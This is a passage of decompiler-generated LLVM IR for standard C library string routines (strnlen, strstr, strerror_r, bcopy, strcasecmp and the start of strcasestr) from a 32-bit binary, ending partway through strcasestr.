dec_label_pc_804f719:                             ; preds = %dec_label_pc_804f716
  %v0_804f719 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f719 = inttoptr i32 %v0_804f719 to i8*
  %v2_804f719 = load i8, i8* %v1_804f719, align 1
  %v10_804f719 = load i1, i1* @df, align 1
  %v11_804f719 = select i1 %v10_804f719, i32 -1, i32 1
  %v12_804f719 = add i32 %v11_804f719, %v0_804f719
  store i32 %v12_804f719, i32* %esi.global-to-local, align 4
  %v4_804f71a = inttoptr i32 %v3_804f71a to i8*
  store i8 %v2_804f719, i8* %v4_804f71a, align 1
  %v5_804f71a = load i32, i32* %edi.global-to-local, align 4
  %v6_804f71a = load i1, i1* @df, align 1
  %v7_804f71a = select i1 %v6_804f71a, i32 -1, i32 1
  %v8_804f71a = add i32 %v7_804f71a, %v5_804f71a
  store i32 %v8_804f71a, i32* %edi.global-to-local, align 4
  %v6_804f71b = icmp eq i8 %v2_804f719, 0
  %v1_804f71d = icmp eq i1 %v6_804f71b, false
  %v0_804f716.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f71d, label %dec_label_pc_804f716, label %dec_label_pc_804f71f

dec_label_pc_804f71f:                             ; preds = %dec_label_pc_804f719
  %v1_804f71f = add i32 %v0_804f716.pre, -1
  store i32 %v1_804f71f, i32* %ecx.global-to-local, align 4
  %v2_804f720 = sext i8 %v2_804f719 to i32
  %v4_804f720 = inttoptr i32 %v8_804f71a to i8*
  %v5_804f720 = call i8* @_memset(i8* %v4_804f720, i32 %v2_804f720, i32 %v1_804f71f)
  %v6_804f720 = ptrtoint i8* %v5_804f720 to i32
  store i32 %v6_804f720, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f716, %dec_label_pc_804f71f
  %v2_804f726 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f726, i32* @edx, align 4
  %v2_804f727 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f727, i32* @esi, align 4
  ret i32 %v4_804f711

; uselistorder directives
  uselistorder i32 %v8_804f71a, { 0, 2, 1 }
  uselistorder i8 %v2_804f719, { 0, 2, 1 }
  uselistorder i32 %v1_804f716, { 1, 0 }
  uselistorder i32 %v4_804f711, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804f72c = ptrtoint i8* %tmp4 to i32
  %v8_804f73f8 = icmp eq i32 %tmp, 0
  %v1_804f74010 = icmp eq i1 %v8_804f73f8, false
  br i1 %v1_804f74010, label %dec_label_pc_804f739, label %dec_label_pc_804f742

dec_label_pc_804f739:                             ; preds = %entry, %dec_label_pc_804f73e
  %v1_804f73f12 = phi i32 [ %v1_804f73f, %dec_label_pc_804f73e ], [ %tmp, %entry ]
  %v0_804f74211 = phi i32 [ %v1_804f73e, %dec_label_pc_804f73e ], [ %v4_804f72c, %entry ]
  %v1_804f739 = inttoptr i32 %v0_804f74211 to i8*
  %v2_804f739 = load i8, i8* %v1_804f739, align 1
  %v3_804f739 = icmp eq i8 %v2_804f739, 0
  br i1 %v3_804f739, label %dec_label_pc_804f742, label %dec_label_pc_804f73e

dec_label_pc_804f73e:                             ; preds = %dec_label_pc_804f739
  %v1_804f73e = add i32 %v0_804f74211, 1
  %v1_804f73f = add i32 %v1_804f73f12, -1
  %v8_804f73f = icmp eq i32 %v1_804f73f, 0
  %v1_804f740 = icmp eq i1 %v8_804f73f, false
  br i1 %v1_804f740, label %dec_label_pc_804f739, label %dec_label_pc_804f742

dec_label_pc_804f742:                             ; preds = %dec_label_pc_804f73e, %dec_label_pc_804f739, %entry
  %v0_804f742.lcssa = phi i32 [ %v4_804f72c, %entry ], [ %v0_804f74211, %dec_label_pc_804f739 ], [ %v1_804f73e, %dec_label_pc_804f73e ]
  %v2_804f742 = sub i32 %v0_804f742.lcssa, %v4_804f72c
  ret i32 %v2_804f742

; uselistorder directives
  uselistorder i32 %v1_804f73f, { 1, 0 }
  uselistorder i32 %v0_804f74211, { 0, 2, 1 }
  uselistorder i32 %v4_804f72c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f739, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f74b = load i32, i32* @ebx, align 4
  %v4_804f74f = ptrtoint i8* %arg2 to i32
  %v2_804f757 = load i8, i8* %arg2, align 1
  %v1_804f75a = icmp eq i8 %v2_804f757, 0
  br i1 %v1_804f75a, label %dec_label_pc_804f80e, label %dec_label_pc_804f765

dec_label_pc_804f765:                             ; preds = %entry
  %v1_804f765 = add i32 %arg1, -1
  br label %dec_label_pc_804f766

dec_label_pc_804f766:                             ; preds = %dec_label_pc_804f772, %dec_label_pc_804f765
  %v0_804f766 = phi i32 [ %v1_804f766, %dec_label_pc_804f772 ], [ %v1_804f765, %dec_label_pc_804f765 ]
  %v1_804f766 = add i32 %v0_804f766, 1
  %v1_804f767 = inttoptr i32 %v1_804f766 to i8*
  %v2_804f767 = load i8, i8* %v1_804f767, align 1
  %v1_804f76a = icmp eq i8 %v2_804f767, 0
  br i1 %v1_804f76a, label %dec_label_pc_804f80c, label %dec_label_pc_804f772

dec_label_pc_804f772:                             ; preds = %dec_label_pc_804f766
  %v14_804f772 = icmp eq i8 %v2_804f767, %v2_804f757
  %v1_804f775 = icmp eq i1 %v14_804f772, false
  br i1 %v1_804f775, label %dec_label_pc_804f766, label %dec_label_pc_804f777

dec_label_pc_804f777:                             ; preds = %dec_label_pc_804f772
  %v1_804f777 = add i32 %v4_804f74f, 1
  %v2_804f77e = inttoptr i32 %v1_804f777 to i8*
  %v3_804f77e = load i8, i8* %v2_804f77e, align 1
  %v1_804f782 = icmp eq i8 %v3_804f77e, 0
  br i1 %v1_804f782, label %dec_label_pc_804f80e, label %dec_label_pc_804f78a

dec_label_pc_804f78a:                             ; preds = %dec_label_pc_804f777
  %v1_804f78a = add i32 %v0_804f766, 2
  %v1_804f7d4 = add i32 %v4_804f74f, 2
  %v2_804f7d4 = inttoptr i32 %v1_804f7d4 to i8*
  br label %dec_label_pc_804f7c0

dec_label_pc_804f795:                             ; preds = %dec_label_pc_804f804
  %v2_804f795 = inttoptr i32 %v0_804f7c6 to i8*
  %v3_804f795 = load i8, i8* %v2_804f795, align 1
  br label %dec_label_pc_804f7b3.preheader

dec_label_pc_804f7b3.preheader:                   ; preds = %dec_label_pc_804f795, %dec_label_pc_804f7c0
  %v0_804f79e.ph.in = phi i8 [ %v4_804f78a.sink.in, %dec_label_pc_804f7c0 ], [ %v3_804f795, %dec_label_pc_804f795 ]
  %v14_804f7b346 = icmp eq i8 %v0_804f79e.ph.in, %v2_804f757
  %v1_804f7b648 = icmp eq i1 %v14_804f7b346, false
  br i1 %v1_804f7b648, label %dec_label_pc_804f79e, label %dec_label_pc_804f7b8

dec_label_pc_804f79e:                             ; preds = %dec_label_pc_804f7b3.preheader, %dec_label_pc_804f7af
  %v0_804f79e50.in = phi i8 [ %v2_804f7b0, %dec_label_pc_804f7af ], [ %v0_804f79e.ph.in, %dec_label_pc_804f7b3.preheader ]
  %v0_804f7a249 = phi i32 [ %v1_804f7af, %dec_label_pc_804f7af ], [ %v0_804f7c6, %dec_label_pc_804f7b3.preheader ]
  %v1_804f79e = icmp eq i8 %v0_804f79e50.in, 0
  br i1 %v1_804f79e, label %dec_label_pc_804f80c, label %dec_label_pc_804f7a2

dec_label_pc_804f7a2:                             ; preds = %dec_label_pc_804f79e
  %v1_804f7a2 = add i32 %v0_804f7a249, 1
  %v1_804f7a3 = inttoptr i32 %v1_804f7a2 to i8*
  %v2_804f7a3 = load i8, i8* %v1_804f7a3, align 1
  %v14_804f7a6 = icmp eq i8 %v2_804f7a3, %v2_804f757
  br i1 %v14_804f7a6, label %dec_label_pc_804f7b8, label %dec_label_pc_804f7ab

dec_label_pc_804f7ab:                             ; preds = %dec_label_pc_804f7a2
  %v1_804f7ab = icmp eq i8 %v2_804f7a3, 0
  br i1 %v1_804f7ab, label %dec_label_pc_804f80c, label %dec_label_pc_804f7af

dec_label_pc_804f7af:                             ; preds = %dec_label_pc_804f7ab
  %v1_804f7af = add i32 %v0_804f7a249, 2
  %v1_804f7b0 = inttoptr i32 %v1_804f7af to i8*
  %v2_804f7b0 = load i8, i8* %v1_804f7b0, align 1
  %v14_804f7b3 = icmp eq i8 %v2_804f7b0, %v2_804f757
  %v1_804f7b6 = icmp eq i1 %v14_804f7b3, false
  br i1 %v1_804f7b6, label %dec_label_pc_804f79e, label %dec_label_pc_804f7b8

dec_label_pc_804f7b8:                             ; preds = %dec_label_pc_804f7af, %dec_label_pc_804f7a2, %dec_label_pc_804f7b3.preheader
  %v0_804f7b8 = phi i32 [ %v0_804f7c6, %dec_label_pc_804f7b3.preheader ], [ %v1_804f7a2, %dec_label_pc_804f7a2 ], [ %v1_804f7af, %dec_label_pc_804f7af ]
  %v1_804f7b8 = add i32 %v0_804f7b8, 1
  br label %dec_label_pc_804f7c0

dec_label_pc_804f7c0:                             ; preds = %dec_label_pc_804f78a, %dec_label_pc_804f7b8
  %v0_804f7c6 = phi i32 [ %v1_804f78a, %dec_label_pc_804f78a ], [ %v1_804f7b8, %dec_label_pc_804f7b8 ]
  %v4_804f78a.sink.in.in.in = phi i32 [ %v1_804f78a, %dec_label_pc_804f78a ], [ %v1_804f7b8, %dec_label_pc_804f7b8 ]
  %v4_804f78a.sink.in.in = inttoptr i32 %v4_804f78a.sink.in.in.in to i8*
  %v4_804f78a.sink.in = load i8, i8* %v4_804f78a.sink.in.in, align 1
  %storemerge5 = icmp eq i8 %v4_804f78a.sink.in, %v3_804f77e
  %v1_804f7c0 = icmp eq i1 %storemerge5, false
  br i1 %v1_804f7c0, label %dec_label_pc_804f7b3.preheader, label %dec_label_pc_804f7c2

dec_label_pc_804f7c2:                             ; preds = %dec_label_pc_804f7c0
  %v1_804f7c6 = add i32 %v0_804f7c6, 1
  %v1_804f7cd = add i32 %v0_804f7c6, -1
  %v2_804f7d0 = inttoptr i32 %v1_804f7c6 to i8*
  %v3_804f7d0 = load i8, i8* %v2_804f7d0, align 1
  %v4_804f7d0 = zext i8 %v3_804f7d0 to i32
  %v3_804f7d4 = load i8, i8* %v2_804f7d4, align 1
  %v4_804f7d4 = zext i8 %v3_804f7d4 to i32
  %v12_804f7d9 = icmp eq i8 %v3_804f7d0, %v3_804f7d4
  %v1_804f7db = icmp eq i1 %v12_804f7d9, false
  br i1 %v1_804f7db, label %dec_label_pc_804f804, label %dec_label_pc_804f7dd

dec_label_pc_804f7dd:                             ; preds = %dec_label_pc_804f7c2, %dec_label_pc_804f7f1
  %v0_804f7f4 = phi i32 [ %v1_804f7f4, %dec_label_pc_804f7f1 ], [ %v1_804f7d4, %dec_label_pc_804f7c2 ]
  %v0_804f7f1 = phi i32 [ %v1_804f7f1, %dec_label_pc_804f7f1 ], [ %v1_804f7c6, %dec_label_pc_804f7c2 ]
  %v0_804f7dd = phi i32 [ %v3_804f7f7, %dec_label_pc_804f7f1 ], [ %v4_804f7d0, %dec_label_pc_804f7c2 ]
  %v1_804f7dd = icmp eq i32 %v0_804f7dd, 0
  br i1 %v1_804f7dd, label %dec_label_pc_804f80e, label %dec_label_pc_804f7e1

dec_label_pc_804f7e1:                             ; preds = %dec_label_pc_804f7dd
  %v1_804f7e1 = add i32 %v0_804f7f1, 1
  %v2_804f7e1 = inttoptr i32 %v1_804f7e1 to i8*
  %v3_804f7e1 = load i8, i8* %v2_804f7e1, align 1
  %v1_804f7e5 = add i32 %v0_804f7f4, 1
  %v2_804f7e5 = inttoptr i32 %v1_804f7e5 to i8*
  %v3_804f7e5 = load i8, i8* %v2_804f7e5, align 1
  %v4_804f7e5 = zext i8 %v3_804f7e5 to i32
  %v12_804f7e9 = icmp eq i8 %v3_804f7e1, %v3_804f7e5
  %v1_804f7eb = icmp eq i1 %v12_804f7e9, false
  br i1 %v1_804f7eb, label %dec_label_pc_804f804, label %dec_label_pc_804f7ed

dec_label_pc_804f7ed:                             ; preds = %dec_label_pc_804f7e1
  %v1_804f7ed = icmp eq i8 %v3_804f7e5, 0
  br i1 %v1_804f7ed, label %dec_label_pc_804f80e, label %dec_label_pc_804f7f1

dec_label_pc_804f7f1:                             ; preds = %dec_label_pc_804f7ed
  %v1_804f7f1 = add i32 %v0_804f7f1, 2
  %v1_804f7f4 = add i32 %v0_804f7f4, 2
  %v1_804f7f7 = inttoptr i32 %v1_804f7f4 to i8*
  %v2_804f7f7 = load i8, i8* %v1_804f7f7, align 1
  %v3_804f7f7 = zext i8 %v2_804f7f7 to i32
  %v1_804f7fb = inttoptr i32 %v1_804f7f1 to i8*
  %v2_804f7fb = load i8, i8* %v1_804f7fb, align 1
  %v12_804f7fe = icmp eq i8 %v2_804f7fb, %v2_804f7f7
  br i1 %v12_804f7fe, label %dec_label_pc_804f7dd, label %dec_label_pc_804f802

dec_label_pc_804f802:                             ; preds = %dec_label_pc_804f7f1
  br label %dec_label_pc_804f804

dec_label_pc_804f804:                             ; preds = %dec_label_pc_804f7e1, %dec_label_pc_804f7c2, %dec_label_pc_804f802
  %v0_804f804 = phi i32 [ %v4_804f7d4, %dec_label_pc_804f7c2 ], [ %v3_804f7f7, %dec_label_pc_804f802 ], [ %v4_804f7e5, %dec_label_pc_804f7e1 ]
  %v1_804f804 = icmp eq i32 %v0_804f804, 0
  %v1_804f806 = icmp eq i1 %v1_804f804, false
  br i1 %v1_804f806, label %dec_label_pc_804f795, label %dec_label_pc_804f80e

dec_label_pc_804f80c:                             ; preds = %dec_label_pc_804f766, %dec_label_pc_804f7ab, %dec_label_pc_804f79e
  br label %dec_label_pc_804f80e

dec_label_pc_804f80e:                             ; preds = %dec_label_pc_804f804, %dec_label_pc_804f7dd, %dec_label_pc_804f7ed, %entry, %dec_label_pc_804f777, %dec_label_pc_804f80c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_804f80c ], [ %v1_804f766, %dec_label_pc_804f777 ], [ %arg1, %entry ], [ %v1_804f7cd, %dec_label_pc_804f7ed ], [ %v1_804f7cd, %dec_label_pc_804f7dd ], [ %v1_804f7cd, %dec_label_pc_804f804 ]
  store i32 %v0_804f74b, i32* @ebx, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_804f7f4, { 1, 0 }
  uselistorder i32 %v1_804f7f1, { 1, 0 }
  uselistorder i8 %v3_804f7e5, { 1, 0, 2 }
  uselistorder i8 %v4_804f78a.sink.in, { 1, 0 }
  uselistorder i32 %v0_804f7c6, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_804f7b0, { 1, 0 }
  uselistorder i32 %v1_804f7af, { 0, 2, 1 }
  uselistorder i8 %v2_804f7a3, { 1, 0 }
  uselistorder i32 %v0_804f7a249, { 1, 0 }
  uselistorder i32 %v1_804f766, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f80e, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_804f80c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f7dd, { 1, 0 }
  uselistorder label %dec_label_pc_804f7c0, { 1, 0 }
  uselistorder label %dec_label_pc_804f79e, { 1, 0 }
  uselistorder label %dec_label_pc_804f7b3.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f829 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f831 = load i32, i32* @ebx, align 4
  ret i32 %v0_804f831
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f84a = icmp ugt i32 %arg1, 124
  br i1 %v6_804f84a, label %dec_label_pc_804f867, label %dec_label_pc_804f84c

dec_label_pc_804f84c:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8056840.165 to i32), i32* @esi, align 4
  %v1_804f85c4 = icmp eq i32 %arg1, 0
  %v1_804f85e11 = icmp eq i1 %v1_804f85c4, false
  br i1 %v1_804f85e11, label %dec_label_pc_804f855, label %dec_label_pc_804f860

dec_label_pc_804f855:                             ; preds = %dec_label_pc_804f84c, %dec_label_pc_804f855
  %v0_804f858 = phi i32 [ %v3_804f858, %dec_label_pc_804f855 ], [ %arg1, %dec_label_pc_804f84c ]
  %v0_804f85b = phi i32 [ %v1_804f85b, %dec_label_pc_804f855 ], [ ptrtoint ([8 x i8]* @global_var_8056840.165 to i32), %dec_label_pc_804f84c ]
  %v1_804f855 = inttoptr i32 %v0_804f85b to i8*
  %v2_804f855 = load i8, i8* %v1_804f855, align 1
  %v7_804f855 = icmp eq i8 %v2_804f855, 0
  %v2_804f858 = zext i1 %v7_804f855 to i32
  %v3_804f858 = add i32 %v2_804f858, %v0_804f858
  %v16_804f858 = icmp eq i32 %v3_804f858, 0
  %v1_804f85b = add i32 %v0_804f85b, 1
  store i32 %v1_804f85b, i32* @esi, align 4
  %v1_804f85e = icmp eq i1 %v16_804f858, false
  br i1 %v1_804f85e, label %dec_label_pc_804f855, label %dec_label_pc_804f860

dec_label_pc_804f860:                             ; preds = %dec_label_pc_804f855, %dec_label_pc_804f84c
  %v0_804f862 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8056840.165 to i32), %dec_label_pc_804f84c ], [ %v1_804f85b, %dec_label_pc_804f855 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f862 = inttoptr i32 %v0_804f862 to i8*
  %v2_804f862 = load i8, i8* %v1_804f862, align 1
  %v3_804f862 = icmp eq i8 %v2_804f862, 0
  %v1_804f865 = icmp eq i1 %v3_804f862, false
  br i1 %v1_804f865, label %dec_label_pc_804f860.dec_label_pc_804f896_crit_edge, label %dec_label_pc_804f867

dec_label_pc_804f860.dec_label_pc_804f896_crit_edge: ; preds = %dec_label_pc_804f860
  br label %dec_label_pc_804f896

dec_label_pc_804f867:                             ; preds = %dec_label_pc_804f860, %entry
  %v1_804f86a = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804f87b = bitcast i32* %stack_var_-17 to i8*
  %v7_804f87b = call i32 @_uintmaxtostr(i8* %v6_804f87b, i32 %arg1, i32 %v1_804f86a, i32 -10, i32 0)
  %v1_804f88a = add i32 %v7_804f87b, -14
  store i32 %v1_804f88a, i32* @esi, align 4
  %v5_804f88d = inttoptr i32 %v1_804f88a to i8*
  store i8* %v5_804f88d, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f88a to i16*
  %v6_804f88e = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8056816.166 to i32), i32 14)
  %v1_804f8a0.pre = load i32, i32* @edi, align 4
  %v0_804f8a6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f896

dec_label_pc_804f896:                             ; preds = %dec_label_pc_804f860.dec_label_pc_804f896_crit_edge, %dec_label_pc_804f867
  %v0_804f8a6 = phi i32 [ %v0_804f862, %dec_label_pc_804f860.dec_label_pc_804f896_crit_edge ], [ %v0_804f8a6.pre, %dec_label_pc_804f867 ]
  %v1_804f8a0 = phi i32 [ %arg3, %dec_label_pc_804f860.dec_label_pc_804f896_crit_edge ], [ %v1_804f8a0.pre, %dec_label_pc_804f867 ]
  %v4_804f896 = icmp eq i32 %arg2, 0
  %v3_804f8a0 = select i1 %v4_804f896, i32 0, i32 %v1_804f8a0
  store i32 %v3_804f8a0, i32* @edi, align 4
  %v5_804f8a6 = inttoptr i32 %v0_804f8a6 to i8*
  store i8* %v5_804f8a6, i8** %stack_var_-108, align 4
  %v3_804f8a7 = call i32 @strlen(i8* %v5_804f8a6)
  %v1_804f8af = add i32 %v3_804f8a7, 1
  store i32 %v1_804f8af, i32* %ebx.global-to-local, align 4
  %v1_804f8b2 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804f8af, %v1_804f8b2
  br i1 %tmp, label %dec_label_pc_804f8b6, label %dec_label_pc_804f8bd

dec_label_pc_804f8b6:                             ; preds = %dec_label_pc_804f896
  store i32 %v1_804f8b2, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f8bd

dec_label_pc_804f8bd:                             ; preds = %dec_label_pc_804f896, %dec_label_pc_804f8b6
  %v0_804f8c2 = phi i32 [ %v1_804f8af, %dec_label_pc_804f896 ], [ %v1_804f8b2, %dec_label_pc_804f8b6 ]
  %v1_804f8bd = icmp eq i32 %v0_804f8c2, 0
  br i1 %v1_804f8bd, label %dec_label_pc_804f8d9, label %dec_label_pc_804f8c1

dec_label_pc_804f8c1:                             ; preds = %dec_label_pc_804f8bd
  %v0_804f8c3 = load i32, i32* @esi, align 4
  %v8_804f8c4 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f8c4, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f8c8 = call i32 @memcpy(i16* %tmp45, i32 %v0_804f8c3, i32 %v0_804f8c2)
  %v1_804f8d4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f8d4 = add i32 %arg2, -1
  %v3_804f8d4 = add i32 %v2_804f8d4, %v1_804f8d4
  %v4_804f8d4 = inttoptr i32 %v3_804f8d4 to i8*
  store i8 0, i8* %v4_804f8d4, align 1
  br label %dec_label_pc_804f8d9

dec_label_pc_804f8d9:                             ; preds = %dec_label_pc_804f8bd, %dec_label_pc_804f8c1
  %v0_804f8d9 = load i32, i32* @ebp, align 4
  %v1_804f8d9 = icmp eq i32 %v0_804f8d9, 0
  br i1 %v1_804f8d9, label %dec_label_pc_804f8e4, label %dec_label_pc_804f8dd

dec_label_pc_804f8dd:                             ; preds = %dec_label_pc_804f8d9
  %v0_804f8dd = load i8*, i8** %stack_var_-108, align 4
  %v1_804f8dd = ptrtoint i8* %v0_804f8dd to i32
  %v2_804f8dd = call i32 @__errno_location(i32 %v1_804f8dd)
  %v0_804f8e2 = load i32, i32* @ebp, align 4
  %v2_804f8e2 = inttoptr i32 %v2_804f8dd to i32*
  store i32 %v0_804f8e2, i32* %v2_804f8e2, align 4
  %v0_804f8e7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f8e4

dec_label_pc_804f8e4:                             ; preds = %dec_label_pc_804f8d9, %dec_label_pc_804f8dd
  %v0_804f8e7 = phi i32 [ 0, %dec_label_pc_804f8d9 ], [ %v0_804f8e7.pre, %dec_label_pc_804f8dd ]
  ret i32 %v0_804f8e7

; uselistorder directives
  uselistorder i32 %v1_804f8b2, { 1, 2, 0 }
  uselistorder i32 %v1_804f8af, { 1, 0, 2 }
  uselistorder i32 %v1_804f85b, { 0, 2, 1 }
  uselistorder i32 %v3_804f858, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8056840.165 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f8e4, { 1, 0 }
  uselistorder label %dec_label_pc_804f8d9, { 1, 0 }
  uselistorder label %dec_label_pc_804f8bd, { 1, 0 }
  uselistorder label %dec_label_pc_804f896, { 1, 0 }
  uselistorder label %dec_label_pc_804f855, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804f900 = inttoptr i32 %arg2 to i8*
  %v3_804f900 = call i32 @memmove(i8* %v2_804f900, i32 %arg1)
  ret i32 %v3_804f900
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f909 = load i32, i32* bitcast (i32** @global_var_8058480.168 to i32*), align 128
  %v4_804f912 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804f91a

dec_label_pc_804f91a:                             ; preds = %dec_label_pc_804f937, %entry
  %storemerge = phi i32 [ %v4_804f912, %entry ], [ %v1_804f938, %dec_label_pc_804f937 ]
  %v0_804f938 = phi i32 [ %v4_804f912, %entry ], [ %v1_804f938, %dec_label_pc_804f937 ]
  %v0_804f93d7 = phi i32 [ 0, %entry ], [ %v0_804f93d8, %dec_label_pc_804f937 ]
  %v0_804f937 = phi i32 [ %arg2, %entry ], [ %v1_804f937, %dec_label_pc_804f937 ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804f91a = icmp eq i32 %v0_804f938, %v0_804f937
  %.pre = inttoptr i32 %v0_804f938 to i8*
  br i1 %v12_804f91a, label %dec_label_pc_804f932, label %dec_label_pc_804f91e

dec_label_pc_804f91e:                             ; preds = %dec_label_pc_804f91a
  %v2_804f91e = load i8, i8* %.pre, align 1
  %v3_804f91e = zext i8 %v2_804f91e to i32
  %v2_804f921 = mul nuw nsw i32 %v3_804f91e, 2
  %v3_804f921 = add i32 %v2_804f921, %v0_804f909
  %v4_804f921 = inttoptr i32 %v3_804f921 to i16*
  %v5_804f921 = load i16, i16* %v4_804f921, align 2
  %v6_804f921 = sext i16 %v5_804f921 to i32
  %v1_804f925 = inttoptr i32 %v0_804f937 to i8*
  %v2_804f925 = load i8, i8* %v1_804f925, align 1
  %v3_804f925 = zext i8 %v2_804f925 to i32
  %v2_804f928 = mul nuw nsw i32 %v3_804f925, 2
  %v3_804f928 = add i32 %v2_804f928, %v0_804f909
  %v4_804f928 = inttoptr i32 %v3_804f928 to i16*
  %v5_804f928 = load i16, i16* %v4_804f928, align 2
  %v6_804f928 = sext i16 %v5_804f928 to i32
  %v2_804f92c = sub nsw i32 %v6_804f921, %v6_804f928
  %v12_804f92c = icmp eq i32 %v2_804f92c, 0
  store i32 %v2_804f92c, i32* @edx, align 4
  %v1_804f930 = icmp eq i1 %v12_804f92c, false
  br i1 %v1_804f930, label %dec_label_pc_804f93b, label %dec_label_pc_804f932

dec_label_pc_804f932:                             ; preds = %dec_label_pc_804f91a, %dec_label_pc_804f91e
  %v0_804f93d8 = phi i32 [ %v2_804f92c, %dec_label_pc_804f91e ], [ %v0_804f93d7, %dec_label_pc_804f91a ]
  %v2_804f932 = load i8, i8* %.pre, align 1
  %v3_804f932 = icmp eq i8 %v2_804f932, 0
  br i1 %v3_804f932, label %dec_label_pc_804f93b, label %dec_label_pc_804f937

dec_label_pc_804f937:                             ; preds = %dec_label_pc_804f932
  %v1_804f937 = add i32 %v0_804f937, 1
  %v1_804f938 = add i32 %v0_804f938, 1
  br label %dec_label_pc_804f91a

dec_label_pc_804f93b:                             ; preds = %dec_label_pc_804f932, %dec_label_pc_804f91e
  %v0_804f93d = phi i32 [ %v0_804f93d8, %dec_label_pc_804f932 ], [ %v2_804f92c, %dec_label_pc_804f91e ]
  ret i32 %v0_804f93d

; uselistorder directives
  uselistorder i32 %v1_804f938, { 1, 0 }
  uselistorder i32 %v0_804f93d8, { 1, 0 }
  uselistorder i32 %v2_804f92c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f937, { 1, 2, 0 }
  uselistorder i32 %v0_804f938, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f932, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f943 = load i32, i32* @ebx, align 4
  %v4_804f947 = ptrtoint i8* %arg1 to i32
  %v1_804f95318 = inttoptr i32 %arg2 to i8*
  %v2_804f9531932 = load i8, i8* %v1_804f95318, align 1
  %v4_804f9552336 = icmp eq i8 %v2_804f9531932, 0
  %v1_804f9572538 = icmp eq i1 %v4_804f9552336, false
  br i1 %v1_804f9572538, label %dec_label_pc_804f95d.lr.ph.lr.ph, label %dec_label_pc_804f98d

dec_label_pc_804f95d.lr.ph.lr.ph:                 ; preds = %entry
  %v3_804f9532033 = zext i8 %v2_804f9531932 to i32
  %v4_804f953.pre.pre = load i32, i32* @eax, align 4
  %v5_804f9532134 = and i32 %v4_804f953.pre.pre, -256
  %v6_804f9532235 = or i32 %v3_804f9532033, %v5_804f9532134
  %v4_804f95d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f95d.lr.ph

dec_label_pc_804f95d.lr.ph:                       ; preds = %dec_label_pc_804f95d.lr.ph.lr.ph, %dec_label_pc_804f988
  %v4_804f95d.pre = phi i32 [ %v4_804f95d.pre.pre, %dec_label_pc_804f95d.lr.ph.lr.ph ], [ %v0_804f967, %dec_label_pc_804f988 ]
  %v6_804f9532241 = phi i32 [ %v6_804f9532235, %dec_label_pc_804f95d.lr.ph.lr.ph ], [ %v6_804f95322, %dec_label_pc_804f988 ]
  %v2_804f9531940 = phi i8 [ %v2_804f9531932, %dec_label_pc_804f95d.lr.ph.lr.ph ], [ %v2_804f95319, %dec_label_pc_804f988 ]
  %v0_804f98839 = phi i32 [ %v4_804f947, %dec_label_pc_804f95d.lr.ph.lr.ph ], [ %v1_804f988, %dec_label_pc_804f988 ]
  br label %dec_label_pc_804f95d

